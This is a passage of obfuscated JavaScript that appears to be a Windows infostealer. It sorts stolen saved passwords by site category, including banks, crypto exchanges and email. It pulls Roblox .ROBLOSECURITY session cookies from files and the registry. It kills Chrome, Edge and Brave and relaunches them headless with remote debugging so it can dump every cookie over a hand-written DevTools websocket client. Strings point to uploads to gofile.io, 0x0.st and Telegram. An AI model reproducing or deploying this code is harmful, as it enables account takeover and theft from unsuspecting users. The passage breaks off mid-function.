        Messaging: [c.UBWTm, c.oeAxR, "telegram.org", c.VsdYW, "whatsapp.com", "signal.org", c.nvVlX, c.WiOYH, c.iIyjw, "viber.com", "teams.microsoft.com"],
        Gaming: [c.uSitA, c.woxGr, "steamcommunity.com", c.armaE, c.kKPGs, c.QLmmL, c.aIuHX, c.XYFAJ, c.uDzwc, c.FSHRY, c.cusYt, c.eBRRQ, c.GZccE, c.aRxVY, "minecraft.net", c.heFLo, "faceit.com", "esea.net", c.rnMRs, c.JTsLh],
        Google: [c.USYez, c.GKvTP, c.SNjSg, c.ECdWo, c.dgEtv, "drive.google.com", "docs.google.com", c.PHpqV],
        Microsoft: [c.uEzEQ, "outlook.com", c.jGjdP, c.dRfaS, c.zqeVL, c.MsZYz, c.jAHXW, "xbox.com", "skype.com", c.lVSiX, c.saetd, c.scjTe, c.LJbbU],
        Shopping: [c.BwAJi, c.KJhSC, "walmart.com", c.kOCtU, c.bprqu, c.rdKVi, "trendyol.com", c.zoMND, c.GyjwO, c.pXJKe, "sahibinden.com", c.QqRkq, "letgo.com"],
        "Finance / Crypto": [c.uhoee, "binance.com", "coinbase.com", c.wSqMw, c.AyOwh, c.xMYBZ, "stripe.com", c.LwGpp, c.vuewW, c.LiosP, c.SrWdc, "enpara.com", c.irJUp, c.YoEcl, c.LosRO, c.Xhrha, c.TMHhK, "vakifbank.com.tr"],
        Streaming: [c.oODAT, c.ZeDJC, "twitch.tv", c.qCqsF, c.oYtvt, "primevideo.com", c.vfGvp, "deezer.com", c.pJuYQ, "apple.com", "music.youtube.com"],
        "Cloud / Dev": ["github.com", c.MrJpm, c.WDzAT, c.AUqrO, c.aFZLA, c.fyCeQ, c.KwuMl, c.zbTGb, c.nAnIU, c.MWtMA, c.OLJoc, "replit.com", c.UVvdh, c.WJfBw],
        Email: [c.GKvTP, c.DUvBJ, c.YNajc, c.ReQiU, c.jYEdF, c.Gfuio, c.azfMD, "icloud.com", c.MsZYz, c.xQulb],
        Education: ["udemy.com", c.ZhQsC, c.QRWts, "khanacademy.org", c.GnnyC, c.wMRaZ, "pluralsight.com", c.pHsMv],
        "VPN / Security": [c.esDBV, c.eoNmA, "surfshark.com", c.kSSjU, "windscribe.com", c.cVZqw, c.ZqFFp, c.YgHFj, c.moVHI]
      };
      const l = k;
      function m(r) {
        if (c.lwaOw("jKvPm", c.VWGZC)) {
          return c.readFileSync(d, c.nEMEF).trim();
        } else {
          if (!r) {
            return "Other";
          }
          const t = r.toLowerCase();
          for (const [v, w] of Object.entries(l)) {
            if (c.lwaOw("bLHsz", "cTogC")) {
              for (const x of w) {
                if (c.gQfIS(c.qqgUZ, "UwSEx")) {
                  c.unlinkSync(x);
                } else if (t.includes(x)) {
                  return v;
                }
              }
            } else {
              c.EyVKC(g, h);
              c.DTHqE(i, j);
            }
          }
          return "Other";
        }
      }
      try {
        if (c.ihFFY(c.RgnqD, c.RgnqD)) {
          c.fPaLn(d, "Direct Telegram upload success");
          const s = {
            link: g,
            size: h
          };
          return s;
        } else {
          const s = [];
          for (const [w, x] of Object.entries(g.groupedData)) {
            if (c.htWxd(c.MnreU, c.MnreU)) {
              try {
                const z = c.FXvXC(g, c.EyxdN, {
                  windowsHide: true,
                  stdio: c.xTLAD,
                  timeout: 5000
                }).toString().toLowerCase();
                if (h.hardware.some(A => z.includes(A.toLowerCase()))) {
                  return true;
                }
              } catch (A) {}
              return false;
            } else {
              for (const z of x) {
                if (c.INsvO(c.PqMGl, c.qjshC)) {
                  const A = z.match(/URL: (.+)/);
                  const B = z.match(/Username: (.+)/);
                  const C = z.match(/Password: (.+)/);
                  const D = z.match(/Application: (.+)/);
                  if (A && B && C) {
                    if (c.XfWwF !== c.XfWwF) {
                      const F = i.join(j, k);
                      if (l.lstatSync(F).isDirectory()) {
                        c.PiKVq(o, F);
                      } else {
                        p.unlinkSync(F);
                      }
                    } else {
                      s.push({
                        url: A[1].trim(),
                        username: B[1].trim(),
                        password: C[1].trim(),
                        application: D ? D[1].trim() : w,
                        category: m(A[1].trim())
                      });
                    }
                  }
                } else {
                  g(h, c.wELmh);
                  c.PiKVq(i, j);
                }
              }
            }
          }
          const t = {};
          for (const G of s) {
            if (c.Saaqe(c.ijsFo, c.wqeei)) {
              if (!t[G.category]) {
                t[G.category] = [];
              }
              t[G.category].push(G);
            } else {
              k();
            }
          }
          const u = Object.keys(l).concat([c.oxWmS]);
          let v = c.yKYIU(user.copyright, "\n");
          v += "========================================\n";
          v += "   PASSWORDS - Total: " + s.length + "\n";
          v += "========================================\n\n";
          for (const I of u) {
            if (c.RPtLH(c.pHNdb, c.RPWBo)) {
              c.EyVKC(g, "[0x0.st] Success (matched): " + h[0]);
              return c.DTHqE(i, j[0]);
            } else {
              if (!t[I] || t[I].length === 0) {
                continue;
              }
              v += "\n╔══════════════════════════════════════╗\n";
              v += "║  " + I.toUpperCase().padEnd(36) + " ║\n";
              v += "║  Count: " + String(t[I].length).padEnd(29) + " ║\n";
              v += "╚══════════════════════════════════════╝\n\n";
              for (const K of t[I]) {
                if (c.gQfIS("LakxX", c.uWBNB)) {
                  const M = j.join(k, l);
                  const N = m.statSync(M);
                  if (N.isDirectory()) {
                    q += c.oPfAt(r, M);
                  } else {
                    s += N.size;
                  }
                } else {
                  const M = c.kDpZh.split("|");
                  let N = 0;
                  while (true) {
                    switch (M[N++]) {
                      case "0":
                        v += "Username: " + K.username + "\n";
                        continue;
                      case "1":
                        v += "Application: " + K.application + "\n\n";
                        continue;
                      case "2":
                        v += "Password: " + K.password + "\n";
                        continue;
                      case "3":
                        v += "===============\n";
                        continue;
                      case "4":
                        v += "URL: " + K.url + "\n";
                        continue;
                    }
                    break;
                  }
                }
              }
            }
          }
          fs.writeFileSync(path.join(i, c.dCftJ), v, c.nEMEF);
        }
      } catch (O) {
        if (c.BOaBH !== c.PJmBG) {
          c.srSjX(logError, O, "fetchUserData-categorize");
        } else {
          return c.from(d, c.WtOkf).toString(c.nEMEF);
        }
      }
    }
  }
  return g.count;
}
function findBrowserExe(b) {
  const c = {
    OZfAz: "log.txt",
    wCJBJ: function (g) {
      return g();
    },
    TqJBe: "utf8",
    Mgyeo: "initializeService-cleanup",
    ZBOMG: function (g, h) {
      return g !== h;
    },
    CFljU: "XNYPb",
    DzodP: function (g, h, i) {
      return g(h, i);
    },
    AZIth: function (g, h) {
      return g + h;
    },
    kBhXh: "where ",
    SEQbG: " 2>nul",
    iXEoA: "PICKc",
    mQZYG: "reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\",
    yXyHk: "ProgramFiles",
    regOD: "C:\\Program Files",
    KteoH: "Chrome",
    LkSfg: "Application",
    fWrST: "Google",
    zQnWF: "chrome.exe",
    tRrQO: "ProgramFiles(x86)",
    pBHxt: "C:\\Program Files (x86)",
    fFQWu: "Microsoft",
    jxIzO: "Edge",
    jPmya: "msedge.exe",
    OeMhA: "BraveSoftware",
    dsUYV: "brave.exe",
    TClfy: "Brave-Browser",
    qrrgu: function (g, h) {
      return g === h;
    },
    ylWlW: "APzAE"
  };
  try {
    if (c.ZBOMG("DRhTg", c.CFljU)) {
      const g = c.DzodP(execSync, c.AZIth(c.kBhXh + b, c.SEQbG), {
        windowsHide: true,
        encoding: c.TqJBe
      }).trim().split("\r\n")[0];
      if (g && fs.existsSync(g)) {
        return g;
      }
    } else {
      if (!n.existsSync(o)) {
        y.mkdirSync(z, {
          recursive: true
        });
      }
      const i = r.join(s, c.OZfAz);
      const j = "[START] " + c.wCJBJ(t) + " | PID: " + u.pid + "\n";
      if (!v.existsSync(i)) {
        A.writeFileSync(i, j, c.TqJBe);
      } else {
        B.appendFileSync(i, j, c.TqJBe);
      }
    }
  } catch (i) {}
  try {
    if (c.ZBOMG(c.iXEoA, "vsOzY")) {
      const k = c.DzodP(execSync, c.mQZYG + b + "\" /ve 2>nul", {
        windowsHide: true,
        encoding: "utf8"
      });
      const l = k.match(/REG_SZ\s+(.+)/);
      if (l && fs.existsSync(l[1].trim())) {
        return l[1].trim();
      }
    } else {
      c(d, c.Mgyeo);
    }
  } catch (o) {}
  const d = [path.join(process.env[c.yXyHk] || c.regOD, "Google", c.KteoH, c.LkSfg, "chrome.exe"), path.join(process.env["ProgramFiles(x86)"] || "C:\\Program Files (x86)", c.fWrST, c.KteoH, c.LkSfg, c.zQnWF), path.join(process.env.LOCALAPPDATA || "", "Google", c.KteoH, "Application", c.zQnWF), path.join(process.env[c.tRrQO] || c.pBHxt, c.fFQWu, c.jxIzO, c.LkSfg, c.jPmya), path.join(process.env[c.yXyHk] || c.regOD, c.fFQWu, "Edge", "Application", c.jPmya), path.join(process.env.LOCALAPPDATA || "", c.OeMhA, "Brave-Browser", c.LkSfg, c.dsUYV), path.join(process.env.ProgramFiles || "C:\\Program Files", "BraveSoftware", c.TClfy, c.LkSfg, c.dsUYV)];
  for (const q of d) {
    if (c.qrrgu(c.ylWlW, "SHKwM")) {
      c(d, "Screenshot-Failed");
    } else if (q.toLowerCase().includes(b.replace(".exe", "").toLowerCase()) && fs.existsSync(q)) {
      return q;
    }
  }
  return null;
}
function extractRobloxDesktopCookie() {
  const c = [];
  try {
    const d = path.join(process.env.LOCALAPPDATA || "", "Roblox", "LocalStorage", "RobloxCookies.dat");
    if (fs.existsSync(d)) {
      const g = fs.readFileSync(d, "utf8");
      const h = g.match(/\.ROBLOSECURITY[^\n]*?(_\|WARNING[^\n]+)/);
      if (h) {
        c.push({
          service: "Roblox (Desktop)",
          host: ".roblox.com",
          name: ".ROBLOSECURITY",
          value: h[1],
          browser: "Roblox Desktop App",
          expiration: "N/A"
        });
      }
    }
  } catch (k) {}
  try {
    const l = execSync("reg query \"HKCU\\SOFTWARE\\Roblox\\RobloxStudioBrowser\\roblox.com\" /v .ROBLOSECURITY 2>nul", {
      timeout: 5000,
      windowsHide: true,
      encoding: "utf8"
    });
    const m = l.match(/\.ROBLOSECURITY\s+REG_SZ\s+(.+)/i);
    if (m && m[1].trim()) {
      let n = m[1].trim();
      if (n.startsWith("COOK::")) {
        n = n.replace(/^COOK::</, "").replace(/>$/, "");
      }
      const o = {
        service: "Roblox (Studio)",
        host: ".roblox.com",
        name: ".ROBLOSECURITY",
        value: n,
        browser: "Roblox Studio",
        expiration: "N/A"
      };
      c.push(o);
    }
  } catch (q) {}
  try {
    const r = path.join(process.env.LOCALAPPDATA || "", "Roblox", "GlobalBasicSettings_13.xml");
    if (fs.existsSync(r)) {
      const t = fs.readFileSync(r, "utf8");
      const u = t.match(/\.ROBLOSECURITY.*?<value>(.*?)<\/value>/s);
      if (u && u[1]) {
        c.push({
          service: "Roblox (Player)",
          host: ".roblox.com",
          name: ".ROBLOSECURITY",
          value: u[1],
          browser: "Roblox Player",
          expiration: "N/A"
        });
      }
    }
  } catch (w) {}
  return c;
}
function cdpSendCommand(a, b, c) {
  const d = {
    kqdtt: "extractPrismLauncherInfo",
    Iyhrc: function (h, i) {
      return h !== i;
    },
    kxyAd: "nObLK",
    EwNiU: "CDP timeout",
    URzHU: "zdoGA",
    Swucy: function (h, i, j) {
      return h(i, j);
    },
    rVsCf: function (h, i) {
      return h + i;
    },
    iewIe: function (h, i) {
      return h * i;
    },
    EOuHU: "http",
    mBlyP: function (h, i) {
      return h(i);
    },
    DaBxj: function (h, i) {
      return h & i;
    },
    QVgmA: function (h, i) {
      return h === i;
    },
    OCeah: "cmHPc",
    Wjzxv: "lTXgZ",
    thDpo: "vZxcf",
    vVNio: "ciVTn",
    sihCQ: "OnAZV",
    CSPmT: "CoRNA",
    MfJrZ: "KUgQz",
    ebphc: "NElGK",
    yQNhh: function (h, i) {
      return h(i);
    },
    bHflq: "base64",
    yLQfh: "websocket",
    jeiom: "Upgrade",
    DsVrU: "error",
    VRmuf: function (h, i) {
      return h(i);
    },
    JiTQS: "injectAtomic",
    DDzoa: "region",
    EROCH: function (h, i) {
      return h < i;
    },
    gKRFy: "oBBXK",
    vJrBJ: "XbwRH",
    aOiHp: "XcYib",
    SsqRa: "end",
    mGXIH: "ZvzTT",
    HeCjg: "<:946246524504002610:962747802830655498>",
    Jofru: "xusEy",
    sqfKC: function (h, i, j) {
      return h(i, j);
    },
    GrZqd: function (h, i) {
      return h + i;
    },
    noNku: "http://127.0.0.1:",
    AeXob: function (h, i) {
      return h(i);
    }
  };
  var g = d.AeXob(require, d.EOuHU);
  return new Promise(function (h, i) {
    const j = {
      uQrXq: d.kqdtt,
      SUpft: function (l, m) {
        return d.Iyhrc(l, m);
      },
      XCpcS: d.kxyAd,
      xseDe: function (l, m) {
        return l(m);
      },
      hSqHc: d.EwNiU,
      hgVMf: "/snapshot",
      JqvyP: "build",
      HBORF: d.URzHU,
      tUFJg: function (l, m, n) {
        return d.Swucy(l, m, n);
      },
      qRHFA: "fetchWallets",
      Lqrxk: function (l, m) {
        return d.rVsCf(l, m);
      },
      PbHoI: function (l, m) {
        return l + m;
      },
      pQzvU: function (l, m) {
        return d.iewIe(l, m);
      },
      VmvRz: d.EOuHU,
      CnyAe: function (l, m) {
        return d.mBlyP(l, m);
      },
      UCgQs: function (l, m) {
        return l < m;
      },
      sXvqR: function (l, m) {
        return d.DaBxj(l, m);
      },
      GoQUN: function (l, m) {
        return d.QVgmA(l, m);
      },
      XhrEA: "ZyTnS",
      NBnrH: function (l, m) {
        return d.QVgmA(l, m);
      },
      jZtgs: d.OCeah,
      bfZBu: d.Wjzxv,
      LpRHS: d.thDpo,
      MgGEw: d.vVNio,
      pMgMI: "utf8",
      VKvrb: d.sihCQ,
      hzzRx: "sys_core_",
      RZRVs: d.CSPmT,
      nfvIx: d.MfJrZ,
      eLaKJ: d.ebphc,
      ABhzh: function (l, m) {
        return d.yQNhh(l, m);
      },
      HxFtx: d.bHflq,
      WNMso: d.yLQfh,
      TjaaJ: d.jeiom,
      mZght: "upgrade",
      xPWCJ: d.DsVrU,
      HYTCF: function (l, m) {
        return d.VRmuf(l, m);
      },
      rDmhJ: d.JiTQS,
      EIRLT: d.DDzoa,
      XxLVC: "eoCva",
      UlJSp: function (l, m) {
        return l | m;
      },
      zCKMB: "utWxA",
      olfKm: "vZfCl",
      HXmTx: function (l, m) {
        return d.EROCH(l, m);
      },
      NqSQF: "data",
      gXSgS: d.gKRFy,
      qSqcW: d.vJrBJ,
      MgNyz: d.aOiHp,
      skBYk: d.SsqRa,
      wFNaN: d.mGXIH,
      sXmPg: function (l, m) {
        return d.yQNhh(l, m);
      },
      XreOh: function (l, m) {
        return d.yQNhh(l, m);
      },
      NgyMF: d.HeCjg
    };
    if (d.Jofru === "xusEy") {
      var k = d.sqfKC(setTimeout, function () {
        const l = {
          OXCzR: j.uQrXq
        };
        const m = l;
        if (j.SUpft(j.XCpcS, "nObLK")) {
          c(d, m.OXCzR);
        } else {
          j.xseDe(i, new Error(j.hSqHc));
        }
      }, 20000);
      g.get(d.rVsCf(d.GrZqd(d.noNku, a), "/json/version"), function (l) {
        const m = {
          TjadZ: j.rDmhJ,
          ceMIA: function (o, p) {
            return o + p;
          },
          fOOom: j.EIRLT,
          eMstW: j.XxLVC,
          FzuMO: function (o, p) {
            return j.CnyAe(o, p);
          },
          cZKqX: function (o, p) {
            return j.GoQUN(o, p);
          },
          NQLDe: "HyIse",
          wgClT: "Sssap",
          hzbic: function (o, p) {
            return o || p;
          },
          iwqwJ: j.pMgMI,
          YBqSs: function (o, p) {
            return j.UCgQs(o, p);
          },
          vnkjU: function (o, p) {
            return j.UlJSp(o, p);
          },
          IMCwT: function (o, p) {
            return o !== p;
          },
          GTWnQ: j.zCKMB,
          yfnaJ: j.olfKm,
          ylEJf: function (o, p) {
            return j.HXmTx(o, p);
          },
          TaTEj: j.NqSQF,
          LqBvR: j.gXSgS,
          jtXkx: function (o, p) {
            return o(p);
          }
        };
        if (j.NBnrH(j.qSqcW, j.MgNyz)) {
          d.unshift(g.resolve(j.hgVMf, j.JqvyP, h));
        } else {
          var n = "";
          l.on(j.NqSQF, function (p) {
            if (j.HBORF === "zdoGA") {
              n += p;
            } else {
              p(d, "Client.init");
            }
          });
          l.on(j.skBYk, function () {
            const p = {
              dgDJm: function (u, v, w) {
                return j.tUFJg(u, v, w);
              },
              gvgMv: j.qRHFA,
              PQDfw: function (u, v) {
                return u | v;
              },
              daMHi: function (u, v) {
                return j.Lqrxk(u, v);
              },
              smMhg: function (u, v) {
                return j.PbHoI(u, v);
              },
              wdHnL: function (u, v) {
                return j.pQzvU(u, v);
              },
              kmJXG: function (u, v) {
                return u + v;
              },
              XHWiP: j.VmvRz,
              arDXP: function (u, v) {
                return j.xseDe(u, v);
              },
              wSJoc: function (u, v) {
                return j.xseDe(u, v);
              },
              JDmSW: function (u, v) {
                return j.CnyAe(u, v);
              },
              XjiMz: function (u, v) {
                return j.SUpft(u, v);
              },
              jlTBh: function (u, v) {
                return j.UCgQs(u, v);
              },
              bSSXK: function (u, v) {
                return j.sXvqR(u, v);
              },
              alMGt: function (u, v) {
                return j.GoQUN(u, v);
              },
              cRsom: function (u, v) {
                return j.GoQUN(u, v);
              },
              fKlKc: j.XhrEA,
              AJElw: function (u, v) {
                return u === v;
              },
              TCRGp: function (u, v) {
                return j.NBnrH(u, v);
              },
              jTvas: j.jZtgs,
              bbYEY: j.bfZBu,
              CuBSs: function (u, v) {
                return j.UCgQs(u, v);
              },
              xavMe: j.LpRHS,
              JxuTF: j.MgGEw,
              PxBGF: j.pMgMI,
              Uqghz: "EEorb",
              GRtxR: j.VKvrb,
              HLrId: function (u, v) {
                return j.xseDe(u, v);
              },
              XpsBI: j.hzzRx,
              zSXCH: "initializeService-unlink-"
            };
            if (j.RZRVs === "GIBjR") {
              j = k.alloc(6);
              l[0] = 129;
              m[1] = n.length | 128;
              o.copy(p, 2);
            } else {
              try {
                if (j.SUpft("KUgQz", j.nfvIx)) {
                  p.dgDJm(c, d, p.gvgMv);
                  return 0;
                } else {
                  var q = JSON.parse(n).webSocketDebuggerUrl;
                  if (!q) {
                    if (j.eLaKJ !== j.eLaKJ) {
                      c(d, m.TjadZ);
                    } else {
                      j.ABhzh(clearTimeout, k);
                      return j.ABhzh(i, new Error("No WS URL"));
                    }
                  }
                  var r = j.ABhzh(require, "url").parse(q);
                  var s = crypto.randomBytes(16).toString(j.HxFtx);
                  const w = {
                    Upgrade: j.WNMso,
                    Connection: j.TjaaJ,
                    "Sec-WebSocket-Key": s,
                    "Sec-WebSocket-Version": "13"
                  };
                  const x = {
                    hostname: r.hostname,
                    port: r.port,
                    path: r.path,
                    headers: w
                  };
                  var t = g.request(x);
                  t.on(j.mZght, function (z, A, B) {
                    const C = {
                      HZTxs: function (K, L) {
                        return m.ceMIA(K, L);
                      },
                      TsURL: function (K, L, M) {
                        return K(L, M);
                      },
                      qdmyA: m.fOOom,
                      WjdJa: function (K, L) {
                        return K === L;
                      },
                      tLNRP: m.eMstW,
                      uDHcR: function (K, L) {
                        return m.FzuMO(K, L);
                      }
                    };
                    if (m.cZKqX(m.NQLDe, m.wgClT)) {
                      var L = p.PQDfw(q[r] << 8, s[t + 1]);
                      if (L > 32767) {
                        L -= 65536;
                      }
                      u.push(p.daMHi(p.daMHi(p.smMhg(p.smMhg(p.wdHnL(L, 4294967296), v[w + 2] << 24 >>> 0), x[y + 3] << 16), z[p.kmJXG(A, 4)] << 8), B[p.smMhg(C, 5)]));
                      D += 6;
                    } else {
                      var D = JSON.stringify({
                        id: 1,
                        method: b,
                        params: m.hzbic(c, {})
                      });
                      var E = Buffer.from(D, m.iwqwJ);
                      var F = crypto.randomBytes(4);
                      var G;
                      if (m.YBqSs(E.length, 126)) {
                        G = Buffer.alloc(6);
                        G[0] = 129;
                        G[1] = m.vnkjU(128, E.length);
                        F.copy(G, 2);
                      } else if (m.IMCwT(m.GTWnQ, m.yfnaJ)) {
                        G = Buffer.alloc(8);
                        G[0] = 129;
                        G[1] = 254;
                        G.writeUInt16BE(E.length, 2);
                        F.copy(G, 4);
                      } else {
                        c += d;
                      }
                      var H = Buffer.alloc(E.length);
                      for (var I = 0; m.ylEJf(I, E.length); I++) {
                        H[I] = E[I] ^ F[I % 4];
                      }
                      A.write(Buffer.concat([G, H]));
                      var J = Buffer.from(B);
                      A.on(m.TaTEj, function (N) {
                        const O = {
                          mQlbA: function (S, T) {
                            return p.JDmSW(S, T);
                          },
                          DuDNw: function (S, T) {
                            return S(T);
                          }
                        };
                        if (p.XjiMz("qqTXC", "qqTXC")) {
                          const T = g.join(h, "Local State");
                          if (I.existsSync(T)) {
                            j.push(T);
                          }
                        } else {
                          J = Buffer.concat([J, N]);
                          if (p.jlTBh(J.length, 2)) {
                            return;
                          }
                          var P = p.bSSXK(J[1], 127);
                          var Q = 2;
                          if (p.alMGt(P, 126)) {
                            if (p.cRsom(p.fKlKc, p.fKlKc)) {
                              if (J.length < 4) {
                                return;
                              }
                              P = J.readUInt16BE(2);
                              Q = 4;
                            } else {
                              const U = I.replace(/[^a-zA-Z0-9 ]/g, "");
                              const V = j.join(k, "Autofills_[" + U + "].txt");
                              l.writeFileSync(V, C.HZTxs(m.copyright, n.join("")), {
                                encoding: "utf8",
                                flag: "w"
                              });
                            }
                          } else if (p.AJElw(P, 127)) {
                            if (p.TCRGp(p.jTvas, p.bbYEY)) {
                              return "<:946246402105819216:962747802797113365>";
                            } else {
                              if (p.jlTBh(J.length, 10)) {
                                return;
                              }
                              P = J.readUInt32BE(2) * 4294967296 + J.readUInt32BE(6);
                              Q = 10;
                            }
                          }
                          if (p.CuBSs(J.length, p.kmJXG(Q, P))) {
                            return;
                          }
                          try {
                            if (p.XjiMz(p.xavMe, p.JxuTF)) {
                              var R = JSON.parse(J.slice(Q, p.daMHi(Q, P)).toString(p.PxBGF));
                              if (p.alMGt(R.id, 1)) {
                                if (p.Uqghz !== p.GRtxR) {
                                  p.arDXP(clearTimeout, k);
                                  A.end();
                                  p.HLrId(h, R.result || {});
                                } else {
                                  O.mQlbA(g, "[0x0.st] Success: " + h);
                                  O.DuDNw(I, j);
                                }
                              }
                            } else {
                              C.TsURL(c, d, "fetchFileVPN-zip");
                            }
                          } catch (X) {}
                        }
                      });
                      A.on("error", function (N) {
                        const O = {
                          zWkBG: C.qdmyA
                        };
                        const P = O;
                        if (C.WjdJa(C.tLNRP, C.tLNRP)) {
                          C.uDHcR(clearTimeout, k);
                          C.uDHcR(i, N);
                        } else if (l.existsSync(m)) {
                          u(v, w.join(x, y.basename(z)), [P.zWkBG], A);
                        }
                      });
                    }
                  });
                  t.on(j.xPWCJ, function (z) {
                    if (m.IMCwT(m.LqBvR, m.LqBvR)) {
                      if (k.endsWith(".ps1") && l.startsWith(p.XpsBI)) {
                        try {
                          y.unlinkSync(z.join(A, B));
                        } catch (B) {
                          p.dgDJm(E, B, p.daMHi(p.zSXCH, F));
                        }
                      }
                    } else {
                      m.FzuMO(clearTimeout, k);
                      m.jtXkx(i, z);
                    }
                  });
                  t.end();
                }
              } catch (z) {
                j.HYTCF(clearTimeout, k);
                j.xseDe(i, z);
              }
            }
          });
        }
      }).on(d.DsVrU, function (l) {
        const m = {
          SYNEM: "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789",
          ZgbpB: function (o, p) {
            return o * p;
          }
        };
        const n = m;
        if (j.NBnrH(j.wFNaN, j.wFNaN)) {
          j.sXmPg(clearTimeout, k);
          j.XreOh(i, l);
        } else {
          const r = n.SYNEM;
          let s = "";
          for (let t = 0; t < t; t++) {
            const u = l.floor(n.ZgbpB(m.random(), r.length));
            s += r[u];
          }
          return s;
        }
      });
    } else {
      b += j.NgyMF;
    }
  });
}
async function fetchCookiesRemoteDebug() {
  const i = {
    EIcHd: function (z, A) {
      return z + A;
    },
    cOCBZ: "https://gofile.io/d/",
    PBqjH: "VnlNE",
    EPxvB: function (z, A, B) {
      return z(A, B);
    },
    xFXTI: function (z, A) {
      return z === A;
    },
    uOxak: "gMsEY",
    NFqgN: "No stack trace",
    rClwE: "utf8",
    sRloR: "[CRITICAL] Failed to write to log file:",
    GVINA: function (z, A) {
      return z(A);
    },
    ytbyz: function (z, A) {
      return z && A;
    },
    YJGpN: "chrome.exe",
    jEgIc: "Chrome",
    sMDoK: "msedge.exe",
    FnvLA: "Edge",
    unSKd: function (z, A) {
      return z + A;
    },
    WRZDD: "\\Microsoft\\Edge\\User Data",
    pdfoy: "brave.exe",
    oJsHG: "Brave",
    skUNr: function (z, A) {
      return z + A;
    },
    LNMEo: "\\BraveSoftware\\Brave-Browser\\User Data",
    HrALU: function (z, A) {
      return z < A;
    },
    VsLzq: function (z, A) {
      return z === A;
    },
    YrELP: "hynVp",
    JVDFB: function (z, A) {
      return z(A);
    },
    dMcfn: function (z, A) {
      return z === A;
    },
    lHGlt: "HuqYN",
    BEfMv: function (z, A, B) {
      return z(A, B);
    },
    gJXhC: function (z, A) {
      return z + A;
    },
    UcfaT: "taskkill /IM \"",
    oEVEw: "\" /F",
    lVZcR: "--remote-debugging-port=",
    RbstU: "--headless=new",
    cJfBQ: "--no-first-run",
    jtJqw: "--disable-extensions",
    GULEn: "--user-data-dir=",
    mQnyE: "cWLSC",
    YLgGg: function (z, A) {
      return z !== A;
    },
    meHLI: "jtKmS",
    hbbea: "llqRb",
    nYOVD: function (z, A, B) {
      return z(A, B);
    },
    hSmdc: "CDP-fetch-",
    uEwzJ: function (z, A) {
      return z === A;
    },
    VwJyZ: "UnWYi",
    gWINJ: function (z, A) {
      return z === A;
    },
    dMhNZ: "UvMdK",
    wPUyM: "uGQsK",
    uWfOD: function (z, A) {
      return z + A;
    },
    vwVKj: "ignore",
    YwUys: function (z, A) {
      return z > A;
    },
    HShsK: function (z, A) {
      return z === A;
    },
    DGDWn: "lngYI",
    gPxWn: "ImbBL",
    Xfave: function (z, A) {
      return z > A;
    },
    BuMha: function (z, A) {
      return z * A;
    },
    JyjzY: "Session",
    asFmB: function (z, A) {
      return z + A;
    },
    nqkBb: function (z, A) {
      return z + A;
    },
    CqjZO: function (z, A) {
      return z + A;
    },
    OWdpL: function (z, A) {
      return z + A;
    },
    PrOUn: function (z, A) {
      return z + A;
    },
    bnIkZ: function (z, A) {
      return z + A;
    },
    wNACX: "================\nHost: ",
    ZyDce: "\nName: ",
    JGpCv: "\nValue: ",
    ZZjXz: "\nApplication: ",
    nnQqn: function (z, A, B) {
      return z(A, B);
    },
    kefKJ: "Wtmcm",
    IEybw: "dtbKa",
    LSVit: function (z, A) {
      return z + A;
    },
    kMCID: "RemoteDebug-"
  };
  var j = [{
    exe: i.YJGpN,
    name: i.jEgIc,
    dataDir: i.EIcHd(user.local, "\\Google\\Chrome\\User Data"),
    port: 19222
  }, {
    exe: i.sMDoK,
    name: i.FnvLA,
    dataDir: i.unSKd(user.local, i.WRZDD),
    port: 19223
  }, {
    exe: i.pdfoy,
    name: i.oJsHG,
    dataDir: i.skUNr(user.local, i.LNMEo),
    port: 19224
  }];
  var k = {};
  var l = [];
  var m = 0;
  for (var n = 0; i.HrALU(n, j.length); n++) {
    if (i.VsLzq(i.YrELP, "hynVp")) {
      var o = j[n];
      try {
        var p = i.JVDFB(findBrowserExe, o.exe);
        if (!p || !fs.existsSync(o.dataDir)) {
          continue;
        }
        try {
          if (i.dMcfn("ATkEN", i.lHGlt)) {
            return v.data.data.downloadPage || i.EIcHd(i.cOCBZ, z.data.data.fileId);
          } else {
            i.BEfMv(execSync, i.gJXhC(i.UcfaT, o.exe) + i.oEVEw, {
              stdio: "ignore",
              windowsHide: true
            });
          }
        } catch (C) {}
        await new Promise(function (D) {
          if (i.PBqjH !== i.PBqjH) {
            const F = {
              browser: y,
              token: i
            };
            g.push(F);
            j++;
          } else {
            i.EPxvB(setTimeout, D, 1500);
          }
        });
        const z = {
          stdio: "ignore",
          windowsHide: true,
          detached: true
        };
        var q = i.GVINA(require, "child_process").spawn(p, [i.skUNr(i.lVZcR, o.port), i.RbstU, "--disable-gpu", i.cJfBQ, "--no-default-browser-check", i.jtJqw, i.GULEn + o.dataDir], z);
        q.unref();
        await new Promise(function (D) {
          if (i.xFXTI(i.uOxak, i.uOxak)) {
            setTimeout(D, 4000);
          } else {
            for (const F of i) {
              if (l.includes(F)) {
                return m;
              }
            }
          }
        });
        var r = [];
        try {
          if (i.mQnyE !== "FeTSN") {
            var s = await i.BEfMv(cdpSendCommand, o.port, "Network.getAllCookies");
            r = s.cookies || [];
          } else {
            g.unlinkSync(y.join(i, j));
          }
        } catch (E) {
          if (i.YLgGg(i.meHLI, i.hbbea)) {
            i.nYOVD(logError, E, i.gJXhC(i.hSmdc, o.name));
          } else {
            try {
              const G = K();
              const H = "[" + G + "] [ERROR] " + L + ": " + (M.message || N) + "\nStack: " + (O.stack || i.NFqgN) + "\n\n";
              P.error("[ERROR] " + Q + ":", R);
              if (!S) {
                return;
              }
              if (!T.existsSync(U)) {
                V.mkdirSync(W, {
                  recursive: true
                });
              }
              const J = X.join(Y, "log.txt");
              Z.appendFileSync(J, H, i.rClwE);
            } catch (K) {
              a1.error(i.sRloR, K);
            }
          }
        }
        try {
          if (i.uEwzJ(i.VwJyZ, i.VwJyZ)) {
            q.kill();
          } else {
            z += i.GVINA(g, y);
          }
        } catch (H) {}
        try {
          if (i.gWINJ(i.dMhNZ, i.wPUyM)) {
            i.EPxvB(v, z, "fetchSocials");
            return 0;
          } else {
            i.EPxvB(execSync, i.uWfOD(i.EIcHd(i.UcfaT, o.exe), i.oEVEw), {
              stdio: i.vwVKj,
              windowsHide: true
            });
          }
        } catch (J) {}
        if (i.YwUys(r.length, 0)) {
          if (i.HShsK(i.DGDWn, i.DGDWn)) {
            var t = [];
            for (var u = 0; i.HrALU(u, r.length); u++) {
              if (i.YLgGg("ImbBL", i.gPxWn)) {
